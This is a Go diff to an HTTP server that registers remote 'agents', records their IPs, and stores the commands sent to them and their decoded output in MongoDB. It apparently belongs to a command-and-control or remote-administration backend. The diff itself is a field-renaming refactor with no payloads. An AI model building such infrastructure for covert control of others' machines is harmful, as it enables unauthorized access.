@@ -64,8 +64,7 @@ func PostTaskResult(w http.ResponseWriter, r *http.Request) {
 	newOutput.Output = string(sDec)
 	newOutput.Command = newCommand.Command
 	newOutput.Date = time.Now()
-	newOutput.Name = agent
-	// newOutput.Platform = "winzoz"
+	newOutput.PCID = agent
 
 	err = mongo.MongoCl.InsertAgentRow(agent, newOutput)
 	if err != nil {
@@ -159,27 +158,24 @@ func GetAgent(w http.ResponseWriter, r *http.Request) {
 // @Param        agent  query      string     true  "agent"
 // @Router /reg/{agent} [post]
 func CreateAgent(w http.ResponseWriter, r *http.Request) {
-	var newAgent mongo.AgentInfo
+	var newAgent mongo.AgentBaseInfo
 	err := json.NewDecoder(r.Body).Decode(&newAgent)
 	if err != nil {
+		log.Fatal("ERROR WHILE DECODING BODY", err)
 		http.Error(w, err.Error(), http.StatusBadRequest)
 		return
 	}
-	newAgent.Date = time.Now()
 	newAgent.IP = getIP(r)
-	newAgent.Command = "Initialized"
-	newAgent.Output = "NULL"
-	newAgent.Platform = "TODO PLATFORM"
 
-	err = mongo.MongoCl.CreateAgentCollection(newAgent.Name)
+	err = mongo.MongoCl.CreateAgentCollection(newAgent.PCID)
 	if err != nil {
 		log.Fatal(err)
 	}
-	err = mongo.MongoCl.InsertAgentRow(newAgent.Name, newAgent)
-	if err != nil {
-		log.Fatal(err)
-	}
-	err = mongo.MongoCl.InsertAgentBaseRow(mongo.AgentBaseInfo{Name: newAgent.Name, IP: newAgent.IP, Platform: newAgent.Platform})
+	// err = mongo.MongoCl.InsertAgentRow(newAgent.Name, newAgent)
+	// if err != nil {
+	// 	log.Fatal(err)
+	// }
+	err = mongo.MongoCl.InsertAgentBaseRow(newAgent)
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -247,7 +243,7 @@ func sendToWs(hub *websocket.Hub, message websocket.Message) {
 func TestWs(w http.ResponseWriter, r *http.Request) {
 	msg := websocket.Message{
 		mongo.AgentInfo{
-			Name:     "DESKTOP",
+			PCID:     "DESKTOP",
 			IP:       "IP TEST",
 			Platform: "Platform TEST",
 		},
@@ -260,7 +256,7 @@ func TestWs(w http.ResponseWriter, r *http.Request) {
 func Test2Ws(w http.ResponseWriter, r *http.Request) {
 	msg := websocket.Message{
 		mongo.AgentInfo{
-			Name:     "T2",
+			PCID:     "T2",
 			IP:       "IP2",
 			Platform: "Platform2",
 		},
